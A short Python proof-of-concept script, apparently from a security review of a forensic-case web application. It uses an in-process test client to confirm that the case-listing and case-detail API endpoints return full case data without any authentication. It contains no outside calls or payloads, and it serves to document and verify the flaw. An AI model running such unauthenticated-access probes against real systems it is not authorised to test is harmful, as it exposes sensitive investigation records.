"""PoC 1: Unauthenticated Case Disclosure & IDOR.
Verifies that GET /api/cases and GET /api/cases/{case_id} allow unauthenticated users
to list and view all forensic cases and investigation sessions.
"""
import sys
from fastapi.testclient import TestClient
from backend.app.main import create_app

def run_poc():
    app = create_app()
    client = TestClient(app)

    # Make unauthenticated GET request to /api/cases
    resp = client.get("/api/cases")
    print(f"GET /api/cases Status Code: {resp.status_code}")
    
    if resp.status_code == 200:
        data = resp.json()
        print(f"CONFIRMED: Unauthenticated access returned {len(data)} cases.")
        if data:
            case_id = data[0]["case_id"]
            resp_detail = client.get(f"/api/cases/{case_id}")
            print(f"GET /api/cases/{case_id} Status Code: {resp_detail.status_code}")
            if resp_detail.status_code == 200:
                print(f"CONFIRMED: Unauthenticated access retrieved full metadata for case '{case_id}'.")
        return True
    else:
        print(f"FAILED: Expected 200 OK, got {resp.status_code}")
        return False

if __name__ == "__main__":
    success = run_poc()
    sys.exit(0 if success else 1)
